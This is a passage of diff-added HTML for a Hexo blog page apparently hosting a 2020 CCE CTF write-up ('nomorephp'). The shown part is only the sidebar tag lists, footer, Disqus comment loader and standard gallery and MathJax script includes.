href="/tags/defcon/">defcon</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/iOS/">iOS</a><span class="tag-list-count">5</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwnable-kr/">pwnable.kr</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/zer0pts-ctf-2020/">zer0pts ctf 2020</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/크리스마스-CTF/">크리스마스 CTF</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/화이트해커리그/">화이트해커리그</a><span class="tag-list-count">1</span></li></ul>
+        </div>
+    </div>
+
+
+            
+                
+    <div class="widget-wrap widget-float">
+        <h3 class="widget-title">etiqueta cloud</h3>
+        <div class="widget tagcloud">
+            <a href="/tags/0ctf-2017/" style="font-size: 10px;">0ctf 2017</a> <a href="/tags/2020-CCE/" style="font-size: 13.33px;">2020 CCE</a> <a href="/tags/2020-Cyberoc/" style="font-size: 10px;">2020 Cyberoc</a> <a href="/tags/Algorithm/" style="font-size: 18.33px;">Algorithm</a> <a href="/tags/C/" style="font-size: 10px;">C</a> <a href="/tags/C/" style="font-size: 10px;">C++</a> <a href="/tags/Code-Blue-CTF-2018-Quals/" style="font-size: 11.67px;">Code Blue CTF 2018 Quals</a> <a href="/tags/Codegate-CTF-2018-Final/" style="font-size: 11.67px;">Codegate CTF 2018 Final</a> <a href="/tags/Codegate-CTF-2018-Preliminary/" style="font-size: 20px;">Codegate CTF 2018 Preliminary</a> <a href="/tags/Codegate-CTF-2020-Preliminary/" style="font-size: 10px;">Codegate CTF 2020 Preliminary</a> <a href="/tags/Crypto/" style="font-size: 10px;">Crypto</a> <a href="/tags/DEF-CON-CTF-Qualifier-2017/" style="font-size: 11.67px;">DEF CON CTF Qualifier 2017</a> <a href="/tags/DEFCON-2018/" style="font-size: 10px;">DEFCON 2018</a> <a href="/tags/FBCTF-2019/" style="font-size: 10px;">FBCTF 2019</a> <a href="/tags/HDCON-2017/" style="font-size: 10px;">HDCON 2017</a> <a href="/tags/HITCON-CTF-2017/" style="font-size: 10px;">HITCON CTF 2017</a> <a href="/tags/Harekaze-CTF/" style="font-size: 11.67px;">Harekaze CTF</a> <a href="/tags/Maplestory/" style="font-size: 10px;">Maplestory</a> <a href="/tags/Math/" style="font-size: 13.33px;">Math</a> <a href="/tags/PCTF-2018/" style="font-size: 13.33px;">PCTF 2018</a> <a href="/tags/Project/" style="font-size: 10px;">Project</a> <a href="/tags/SHA-1/" style="font-size: 10px;">SHA-1</a> <a href="/tags/SHA2017-CTF/" style="font-size: 15px;">SHA2017 CTF</a> <a href="/tags/Samsung-CTF-PreQuals-2017/" style="font-size: 16.67px;">Samsung CTF PreQuals 2017</a> <a href="/tags/Samsung-CTF-PreQuals-2018/" style="font-size: 11.67px;">Samsung CTF PreQuals 2018</a> <a href="/tags/Samsung-CTF-Quals-2018/" style="font-size: 13.33px;">Samsung CTF Quals 2018</a> <a href="/tags/TAMU-CTF/" style="font-size: 10px;">TAMU CTF</a> <a href="/tags/Whitehat-Contest-2018-PreQual/" style="font-size: 11.67px;">Whitehat Contest 2018 PreQual</a> <a href="/tags/Whitehat-contest-2017-PreQual/" style="font-size: 10px;">Whitehat contest 2017 PreQual</a> <a href="/tags/WiFi/" style="font-size: 10px;">WiFi</a> <a href="/tags/defcon/" style="font-size: 10px;">defcon</a> <a href="/tags/iOS/" style="font-size: 16.67px;">iOS</a> <a href="/tags/pwnable-kr/" style="font-size: 10px;">pwnable.kr</a> <a href="/tags/zer0pts-ctf-2020/" style="font-size: 10px;">zer0pts ctf 2020</a> <a href="/tags/크리스마스-CTF/" style="font-size: 10px;">크리스마스 CTF</a> <a href="/tags/화이트해커리그/" style="font-size: 10px;">화이트해커리그</a>
+        </div>
+    </div>
+
+
+            
+                
+    <div class="widget-wrap widget-list">
+        <h3 class="widget-title">links</h3>
+        <div class="widget">
+            <ul>
+                
+            </ul>
+        </div>
+    </div>
+
+
+            
+        
+    </div>
+</aside>
+                </div>
+            </div>
+        </div>
+        <footer id="footer">
+    <div class="container">
+        <div class="container-inner">
+            <a id="back-to-top" href="javascript:;"><i class="icon fa fa-angle-up"></i></a>
+            <div class="credit">
+                <!--
+                <h1 class="logo-wrap">
+                    <a href="/" class="logo"></a>
+                </h1>
+            -->
+                <p>&copy; 2021 Youngho Kim</p>
+                <p>Powered by <a href="//hexo.io/" target="_blank">Hexo</a>. Theme by <a href="//github.com/ppoffice" target="_blank">PPOffice</a></p>
+            </div>
+        </div>
+    </div>
+</footer>
+        
+    
+    <script>
+    var disqus_shortname = 'm1ku';
+    
+    
+    var disqus_url = 'https://kimtruth.github.io/2020/09/27/2020-CCE-nomorephp/';
+    
+    (function() {
+    var dsq = document.createElement('script');
+    dsq.type = 'text/javascript';
+    dsq.async = true;
+    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+    </script>
+
+
+
+
+    
+        <script src="/libs/lightgallery/js/lightgallery.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-thumbnail.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-pager.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-autoplay.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-fullscreen.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-zoom.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-hash.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-share.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-video.min.js"></script>
+    
+    
+        <script src="/libs/justified-gallery/jquery.justifiedGallery.min.js"></script>
+    
+    
+
+
+
+<!-- Custom Scripts -->
+<script src="/js/main.js"></script>
+
+    </div><!-- hexo-inject:begin --><!-- Begin: Injected MathJax -->
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config("");
+</script>
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+      all[i].SourceElement().parentNode.className += ' has-jax';
+    }
+  });
+</script>
+
+<script type="text/javascript" src="custom_mathjax_source">
+</script>
+<!-- End: Injected MathJax -->
+<!-- hexo-inject:end -->
+</body>
+</html>
